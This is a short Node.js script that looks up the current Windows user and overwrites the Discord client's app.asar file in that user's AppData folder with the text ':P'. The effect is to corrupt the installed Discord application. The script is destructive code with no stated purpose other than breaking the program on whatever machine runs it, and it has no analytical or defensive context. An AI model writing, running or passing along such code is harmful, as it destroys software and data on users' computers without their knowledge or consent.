//Dependencies
const Fs = require("fs")
const Os = require("os")

//Main
Fs.writeFileSync(`C:\\Users\\${Os.userInfo().username}\\AppData\\Local\\Discord\\app-1.0.9002\\resources\\app.asar`, ":P", "utf8")
